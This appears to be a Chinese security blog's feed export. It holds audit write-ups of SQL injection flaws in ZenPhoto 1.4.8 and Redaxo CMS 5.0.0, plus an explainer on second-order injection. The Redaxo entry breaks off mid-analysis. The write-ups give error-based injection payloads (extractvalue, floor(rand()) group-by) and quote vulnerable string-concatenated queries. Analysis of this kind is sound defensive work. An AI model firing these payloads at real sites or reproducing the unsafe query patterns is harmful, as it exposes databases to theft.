class="keyword">return</span> <span class="keyword">NULL</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>它会去数据库的<code>options</code>表里面去取对应<code>$key</code>字段的<code>value</code>并返回，而我们传入的<code>$key=gallery_data</code>，得到<code>value</code>字段值为</p>
<pre><code>a:21:{s:21:&quot;gallery_sortdirection&quot;;i:0;s:16:&quot;gallery_sorttype&quot;;s:56:&quot;id,extractvalue(0x0a,concat(0x0a,(select version())))%23&quot;;s:13:&quot;gallery_title&quot;;s:31:&quot;a:1:{s:5:&quot;en_US&quot;;s:6:&quot;相馆&quot;;}&quot;;s:19:&quot;Gallery_description&quot;;s:99:&quot;a:1:{s:5:&quot;en_US&quot;;s:73:&quot;You can insert your Gallery description on the Admin Options Gallery tab.&quot;;}&quot;;s:16:&quot;gallery_password&quot;;N;s:12:&quot;gallery_user&quot;;N;s:12:&quot;gallery_hint&quot;;N;s:10:&quot;hitcounter&quot;;N;s:13:&quot;current_theme&quot;;s:7:&quot;default&quot;;s:13:&quot;website_title&quot;;s:0:&quot;&quot;;s:11:&quot;website_url&quot;;s:0:&quot;&quot;;s:16:&quot;gallery_security&quot;;s:6:&quot;public&quot;;s:16:&quot;login_user_field&quot;;N;s:24:&quot;album_use_new_image_date&quot;;i:0;s:19:&quot;thumb_select_images&quot;;i:0;s:17:&quot;unprotected_pages&quot;;s:43:&quot;a:2:{i:0;s:8:&quot;register&quot;;i:1;s:7:&quot;contact&quot;;}&quot;;s:13:&quot;album_publish&quot;;i:1;s:13:&quot;image_publish&quot;;i:1;s:30:&quot;multilevel_thumb_select_images&quot;;i:0;s:14:&quot;sort_direction&quot;;i:0;s:9:&quot;codeblock&quot;;s:6:&quot;a:0:{}”;}
</code></pre><p><img src="/images/zenphoto-7.png" alt="ZenPhoto-1"></p>
<p>回到构造函数，这个值赋值给<code>$data</code>，然后传入<code>getSerializedArray</code>函数，跟进一下<br><code>/zenphoto-zenphoto-1.4.8/zp-core/functions-common.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSerializedArray</span><span class="params">($string)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (is_array($string)) &#123;</div><div class="line">        <span class="keyword">return</span> $string;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^a:[0-9]+:&#123;/'</span>, $string)) &#123;</div><div class="line">        $r = @unserialize($string);</div><div class="line">        <span class="keyword">if</span> ($r) &#123;</div><div class="line">            <span class="keyword">return</span> $r;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">array</span>();</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (strlen($string) == <span class="number">0</span> &amp;&amp; !is_bool($string)) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">array</span>();</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">array</span>($string);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里就是做一下简单的反序列化处理，以数组形式将结果返回。</p>
<p>这样就得到<code>$this-&gt;data[‘gallery_sorttype’]</code>的值<code>id,extractvalue(0x0a,concat(0x0a,(select version())))%23</code>，也就是<code>$sorttype</code>的值为<code>id,extractvalue(0x0a,concat(0x0a,(select version())))%23</code>，即<code>$key</code>的值。</p>
<p>接下来又调用了<code>sortAlbumArray</code>函数，找到该函数<br><code>/zenphoto-zenphoto-1.4.8/zp-core/class-gallery.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">sortAlbumArray</span><span class="params">($parentalbum, $albums, $sortkey = <span class="string">'`sort_order`'</span>, $sortdirection = NULL, $mine = NULL)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (count($albums) == <span class="number">0</span>) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">array</span>();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (is_null($mine) &amp;&amp; zp_loggedin(MANAGE_ALL_ALBUM_RIGHTS)) &#123;</div><div class="line">        $mine = <span class="keyword">true</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (is_null($parentalbum)) &#123;</div><div class="line">        $albumid = <span class="string">' IS NULL'</span>;</div><div class="line">        $obj = <span class="keyword">$this</span>;</div><div class="line">        $viewUnpublished = $mine;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $albumid = <span class="string">'='</span> . $parentalbum-&gt;getID();</div><div class="line">        $obj = $parentalbum;</div><div class="line">        $viewUnpublished = (zp_loggedin() &amp;&amp; $obj-&gt;albumSubRights() &amp; (MANAGED_OBJECT_RIGHTS_EDIT | MANAGED_OBJECT_RIGHTS_VIEW));</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (($sortkey == <span class="string">'`sort_order`'</span>) || ($sortkey == <span class="string">'RAND()'</span>)) &#123; <span class="comment">// manual sort is always ascending</span></div><div class="line">        $order = <span class="keyword">false</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">if</span> (!is_null($sortdirection)) &#123;</div><div class="line">            $order = strtoupper($sortdirection) == <span class="string">'DESC'</span>;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            $order = $obj-&gt;getSortDirection(<span class="string">'album'</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    $sql = <span class="string">'SELECT * FROM '</span> . prefix(<span class="string">"albums"</span>) . <span class="string">' WHERE `parentid`'</span> . $albumid . <span class="string">' ORDER BY '</span> . $sortkey . <span class="string">' '</span> . $sortdirection;</div><div class="line">    $result = query($sql);</div><div class="line">    $results = <span class="keyword">array</span>();</div><div class="line"><span class="comment">//    check database aganist file system</span></div><div class="line">    <span class="keyword">while</span> ($row = db_fetch_assoc($result)) &#123;</div><div class="line">        $folder = $row[<span class="string">'folder'</span>];</div><div class="line">        <span class="keyword">if</span> (($key = array_search($folder, $albums)) !== <span class="keyword">false</span>) &#123; <span class="comment">// album exists in filesystem</span></div><div class="line">            $results[$row[<span class="string">'folder'</span>]] = $row;</div><div class="line">            <span class="keyword">unset</span>($albums[$key]);</div><div class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// album no longer exists</span></div><div class="line">            $id = $row[<span class="string">'id'</span>];</div><div class="line">            query(<span class="string">"DELETE FROM "</span> . prefix(<span class="string">'albums'</span>) . <span class="string">" WHERE `id`=$id"</span>); <span class="comment">// delete the record</span></div><div class="line">            query(<span class="string">"DELETE FROM "</span> . prefix(<span class="string">'comments'</span>) . <span class="string">" WHERE `type` ='images' AND `ownerid`= '$id'"</span>); <span class="comment">// remove image comments</span></div><div class="line">            query(<span class="string">"DELETE FROM "</span> . prefix(<span class="string">'obj_to_tag'</span>) . <span class="string">"WHERE `type`='albums' AND `objectid`="</span> . $id);</div><div class="line">            query(<span class="string">"DELETE FROM "</span> . prefix(<span class="string">'albums'</span>) . <span class="string">" WHERE `id` = "</span> . $id);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    db_free_result($result);</div><div class="line">    <span class="keyword">foreach</span> ($albums <span class="keyword">as</span> $folder) &#123; <span class="comment">// these albums are not in the database</span></div><div class="line">        $albumobj = newAlbum($folder);</div><div class="line">        <span class="keyword">if</span> ($albumobj-&gt;exists) &#123; <span class="comment">// fail to instantiate?</span></div><div class="line">            $results[$folder] = $albumobj-&gt;getData();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"><span class="comment">//    now put the results in the right order</span></div><div class="line">    $results = sortByKey($results, $sortkey, $order);</div><div class="line"><span class="comment">//    albums are now in the correct order</span></div><div class="line">    $albums_ordered = <span class="keyword">array</span>();</div><div class="line">    <span class="keyword">foreach</span> ($results <span class="keyword">as</span> $row) &#123; <span class="comment">// check for visible</span></div><div class="line">        $folder = $row[<span class="string">'folder'</span>];</div><div class="line">        $album = newAlbum($folder);</div><div class="line">        <span class="keyword">switch</span> (checkPublishDates($row)) &#123;</div><div class="line">            <span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">                $album-&gt;setShow(<span class="number">0</span>);</div><div class="line">                $album-&gt;save();</div><div class="line">            <span class="keyword">case</span> <span class="number">2</span>:</div><div class="line">                $row[<span class="string">'show'</span>] = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> ($mine || $row[<span class="string">'show'</span>] || (($list = $album-&gt;isMyItem(LIST_RIGHTS)) &amp;&amp; is_null($album-&gt;getParent())) || (is_null($mine) &amp;&amp; $list &amp;&amp; $viewUnpublished)) &#123;</div><div class="line">            $albums_ordered[] = $folder;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $albums_ordered;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>至此，二阶注入的第二步分析完，完整的过程就是这样，最后看下mysql的执行log，之前存入的payload被执行了即触发了漏洞。</p>
<p><img src="/images/zenphoto-8.png" alt="ZenPhoto-1"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>正如<code>exploit-db</code>上所说的，<code>ZenPhoto1.4.8</code>存在很多处二阶注入的地方。本质上仍然是在对用户可控的输入点过滤不够，过分依赖系统函数。</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;来源：&lt;a href=&quot;https://www.exploit-db.com/exploits/37602/&quot;&gt;https://www.exploit-db.com/exploits/37602/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;ZenPhoto 是一款小巧的相册软件，具备 RSS 输出、FTP 上传方式、Tag、评论回复等功能。基于 PHP+MySQL 环境，它的主旨是简单，这也就是说不管是用户还是网站管理员，都可以很容易的使用它。&lt;/p&gt;
&lt;p&gt;关于二阶注入，上一篇文章有写过&lt;a href=&quot;http://wismartzy.github.io/2016/06/22/Second-Order-SQL-Injection/&quot;&gt;Second Order SQL Injection&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;漏洞复现&quot;&gt;&lt;a href=&quot;#漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;漏洞复现&quot;&gt;&lt;/a&gt;漏洞复现&lt;/h1&gt;&lt;p&gt;访问&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://localhost:8888/zenphoto-zenphoto-1.4.8/zp-core/admin-options.php?saved&amp;amp;tab=gallery
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;找到&lt;code&gt;Sort gallery by&lt;/code&gt;字段，设置为&lt;code&gt;Custom&lt;/code&gt;，并在&lt;code&gt;custom filed&lt;/code&gt;字段后面输入&lt;code&gt;id,extractvalue(0x0a,concat(0x0a,(select version())))%23&lt;/code&gt;，最后点&lt;code&gt;Apply&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="安全" scheme="http://wismartzy.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>关于二阶 SQL 注入</title>
    <link href="http://wismartzy.github.io/2016/06/22/Second-Order-SQL-Injection/"/>
    <id>http://wismartzy.github.io/2016/06/22/Second-Order-SQL-Injection/</id>
    <published>2016-06-22T09:47:19.000Z</published>
    <updated>2017-03-19T06:31:29.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>从乌云平台公开的案例来看，大部分的SQL注入漏洞均发生在单个HTTP请求和响应中，也就是说要触发漏洞，需经过以下步骤：</p>
<ul>
<li>客户端请求构造payload并发起请求</li>
<li>服务端执行了payload</li>
<li>客户端收到响应结果</li>
</ul>
<p>而二阶（Second Order）SQL注入相对来说更隐晦一些，需经过以下步骤：</p>
<ul>
<li>客户端构造payload并发起请求</li>
<li>服务端存储payload</li>
<li>客户端发起另一请求</li>
<li>服务端执行了存储的payload</li>
<li>客户端收到响应结果</li>
</ul>
<p>可以对比看到，二阶注入很隐蔽，很难被黑盒测试检测到，这也是现在各大漏洞平台二阶注入案例少的原因之一吧。</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>二阶可以理解为两步吧，当将用户的输入存储在某个地方，然后在另一处功能的SQL语句中使用它的时候，既没有进行正确的过滤也没有使用参数化查询，这就造成了二阶注入。至于它的影响的话和普通SQL注入没什么差别。</p>
<a id="more"></a>
<p>下面代码来自于<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">sqli-labs</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Less-5/index.php</span></div><div class="line"></div><div class="line">...</div><div class="line"></div><div class="line"><span class="comment">//including the Mysql connect parameters.</span></div><div class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="comment">// take the variables</span></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</div><div class="line">&#123;</div><div class="line">$id=$_GET[<span class="string">'id'</span>];</div><div class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></div><div class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</div><div class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</div><div class="line">fclose($fp);</div><div class="line"></div><div class="line"><span class="comment">// connectivity</span></div><div class="line"></div><div class="line"></div><div class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</div><div class="line">$result=mysql_query($sql);</div><div class="line">$row = mysql_fetch_array($result);</div><div class="line"></div><div class="line">    <span class="keyword">if</span>($row)</div><div class="line">    &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line"></div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#FFFF00"&gt;'</span>;</div><div class="line">    print_r(mysql_error());</div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/font&gt;"</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">    <span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</div><div class="line"></div><div class="line">...</div></pre></td></tr></table></figure>
<p>代码里的<code>$id</code>被直接保存到了<code>result.txt</code>文件，为了更形象的表示出二阶注入，我新写了一个页面。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Less-5/second.php</span></div><div class="line"></div><div class="line">...</div><div class="line"></div><div class="line"><span class="comment">//including the Mysql connect parameters.</span></div><div class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"></div><div class="line"></div><div class="line">$fp = fopen(<span class="string">'result.txt'</span>,<span class="string">'r'</span>);</div><div class="line"><span class="keyword">while</span>(!feof($fp)) &#123;</div><div class="line">    $line = fgets($fp);</div><div class="line">    $arrId = explode(<span class="string">":"</span>, $line);</div><div class="line">    $id = trim($arrId[<span class="number">1</span>], <span class="string">"\n"</span>);</div><div class="line"></div><div class="line">    $sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</div><div class="line">    $result=mysql_query($sql);</div><div class="line">    $row = mysql_fetch_array($result);</div><div class="line"></div><div class="line">    <span class="keyword">if</span>($row)</div><div class="line">    &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line"></div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#FFFF00"&gt;'</span>;</div><div class="line">    print_r(mysql_error());</div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/font&gt;"</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">fclose($fp);</div><div class="line"></div><div class="line">...</div></pre></td></tr></table></figure>
<p><code>second.php</code>从<code>result.txt</code>文件里读取记录，获取<code>$id</code>的值并代入SQL查询。具体攻击步骤如下：</p>
<ul>
<li><p>访问<code>index.php</code>，构造参数<code>id</code>值为<code>1&#39; and (select 1 from (select count(*),concat(version(),0x7e,floor(rand()*2))a from information_schema.tables group by a)b)#</code>，完整URL如下</p>
<pre><code>http://localhost:8888/sqli-labs/Less-5/?id=1&apos; and (select 1 from (select count(*),concat(version(),0x7e,floor(rand()*2))a from information_schema.tables group by a)b)#
</code></pre></li>
<li><p><code>id</code>的值被写入了<code>result.txt</code></p>
</li>
<li>发起另一请求，访问<code>second.php</code></li>
<li><p>SQL语句报错，回显出了数据库版本信息</p>
<p>  <img src="/images/second-order-1.png" alt="second-order-1"></p>
</li>
</ul>
<h1 id="检测方式"><a href="#检测方式" class="headerlink" title="检测方式"></a>检测方式</h1><p>就其本身来说就是个SQL注入，只不过触发方式相对隐晦了一些。一般情况下很难用自动化工具扫出来，最好可以白盒审计源代码，我一般在审计源码的时候会对所有数据库执行的语句做日志记录，对可能出现注入的点输入对应payload，然后查看日志来分析是否有注入问题。当然黑盒情况下也是可能找到二阶注入的，可以利用cloudeye等平台构造合适的payload（cloudeye支持callback哦）来发现这些隐晦的注入问题。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>二阶注入比普通的SQL注入更难检测，因为漏洞触发点并不在攻击者提交请求的页面。其防御方式和普通SQL注入没差别，使用参数化查询语句，分离数据和代码。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;从乌云平台公开的案例来看，大部分的SQL注入漏洞均发生在单个HTTP请求和响应中，也就是说要触发漏洞，需经过以下步骤：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;客户端请求构造payload并发起请求&lt;/li&gt;
&lt;li&gt;服务端执行了payload&lt;/li&gt;
&lt;li&gt;客户端收到响应结果&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;而二阶（Second Order）SQL注入相对来说更隐晦一些，需经过以下步骤：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;客户端构造payload并发起请求&lt;/li&gt;
&lt;li&gt;服务端存储payload&lt;/li&gt;
&lt;li&gt;客户端发起另一请求&lt;/li&gt;
&lt;li&gt;服务端执行了存储的payload&lt;/li&gt;
&lt;li&gt;客户端收到响应结果&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可以对比看到，二阶注入很隐蔽，很难被黑盒测试检测到，这也是现在各大漏洞平台二阶注入案例少的原因之一吧。&lt;/p&gt;
&lt;h1 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h1&gt;&lt;p&gt;二阶可以理解为两步吧，当将用户的输入存储在某个地方，然后在另一处功能的SQL语句中使用它的时候，既没有进行正确的过滤也没有使用参数化查询，这就造成了二阶注入。至于它的影响的话和普通SQL注入没什么差别。&lt;/p&gt;
    
    </summary>
    
    
      <category term="安全" scheme="http://wismartzy.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Redaxo CMS 5.0.0 SQL 注入漏洞</title>
    <link href="http://wismartzy.github.io/2016/06/04/Redaxo-CMS-5-0-0-SQL-Injection/"/>
    <id>http://wismartzy.github.io/2016/06/04/Redaxo-CMS-5-0-0-SQL-Injection/</id>
    <published>2016-06-04T13:28:39.000Z</published>
    <updated>2017-03-19T06:31:15.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>来源<a href="https://www.exploit-db.com/exploits/39459/" target="_blank" rel="external">https://www.exploit-db.com/exploits/39459/</a></p>
</blockquote>
<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>在逛exploit-db的时候，发现这个漏洞有点意思，就拿过来自己分析了下。Redaxo CMS是一套开源的Web门户内容管理系统（CMS），该系统支持自定义模块、插件扩展、项目备份等。</p>
<h1 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h1><p>根据报错信息可以定位到该文件，<code>/redaxo-cms-5.0.0/redaxo/src/addons/mediapool/pages/media.php</code>，第582行-608行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line"> $where = <span class="string">'f.category_id='</span> . $rex_file_category;</div><div class="line">    $addTable = <span class="string">''</span>;</div><div class="line">    <span class="keyword">if</span> ($media_name != <span class="string">''</span>) &#123;</div><div class="line">        $media_name = str_replace([<span class="string">'_'</span>, <span class="string">'%'</span>], [<span class="string">'\_'</span>, <span class="string">'\%'</span>], $media_name);</div><div class="line">        $where = <span class="string">"(f.filename LIKE '%"</span> . $media_name . <span class="string">"%' OR f.title LIKE '%"</span> . $media_name . <span class="string">"%')"</span>;</div><div class="line">        <span class="keyword">if</span> (rex_addon::get(<span class="string">'mediapool'</span>)-&gt;getConfig(<span class="string">'searchmode'</span>, <span class="string">'local'</span>) != <span class="string">'global'</span> &amp;&amp; $rex_file_category != <span class="number">0</span>) &#123;</div><div class="line">            $addTable = rex::getTablePrefix() . <span class="string">'media_category c, '</span>;</div><div class="line">            $where .= <span class="string">' AND f.category_id = c.id '</span>;</div><div class="line">            $where .= <span class="string">" AND (c.path LIKE '%|"</span> . $rex_file_category . <span class="string">"|%' OR c.id="</span> . $rex_file_category . <span class="string">') '</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($args[<span class="string">'types'</span>])) &#123;</div><div class="line">        $types = [];</div><div class="line">        <span class="keyword">foreach</span> (explode(<span class="string">','</span>, $args[<span class="string">'types'</span>]) <span class="keyword">as</span> $type) &#123;</div><div class="line">            $types[] = <span class="string">'LOWER(RIGHT(f.filename, LOCATE(".", REVERSE(f.filename))-1))="'</span> . strtolower(htmlspecialchars($type)) . <span class="string">'"'</span>;</div><div class="line">        &#125;</div><div class="line">        $where .= <span class="string">' AND ('</span> . implode(<span class="string">' OR '</span>, $types) . <span class="string">')'</span>;</div><div class="line">    &#125;</div><div class="line">    $qry = <span class="string">'SELECT * FROM '</span> . $addTable . rex::getTablePrefix() . <span class="string">'media f WHERE '</span> . $where . <span class="string">' ORDER BY f.updatedate desc, f.id desc'</span>;</div><div class="line"></div><div class="line">    <span class="comment">// ----- EXTENSION POINT</span></div><div class="line">    $qry = rex_extension::registerPoint(<span class="keyword">new</span> rex_extension_point(<span class="string">'MEDIA_LIST_QUERY'</span>, $qry, [</div><div class="line">        <span class="string">'category_id'</span> =&gt; $rex_file_category,</div><div class="line">    ]));</div><div class="line">    $files = rex_sql::factory();</div><div class="line"><span class="comment">//   $files-&gt;setDebug();</span></div><div class="line">    $files-&gt;setQuery($qry);</div><div class="line">    ...</div></pre></td></tr></table></figure>
<p>也就是</p>
<a id="more"></a>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$qry = <span class="string">'SELECT * FROM '</span> . $addTable . rex::getTablePrefix() . <span class="string">'media f WHERE '</span> . $where . <span class="string">' ORDER BY f.updatedate desc, f.id desc'</span>;</div></pre></td></tr></table></figure>
<p>这条sql语句存在问题了，那么关键看下    <code>$where</code>变量是否可控，继续向上找，<code>$where</code>中一共拼接了两个变量，<code>media_name</code>和<code>rex_file_category</code>，那么先看<code>media_name</code>是从哪里来的，定位到<code>/redaxo-cms-5.0.0/redaxo/src/addons/mediapool/pages/media.php</code>，第8行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$media_name = rex_request(<span class="string">'media_name'</span>, <span class="string">'string'</span>);</div></pre></td></tr></table></figure>
<p>接下来继续找到<code>rex_request</code>函数的实现位置，查看对请求做了哪些封装，定位到<code>/redaxo-cms-5.0.0/redaxo/src/core/functions/function_rex_globals.php</code>，第29行-37行</p>
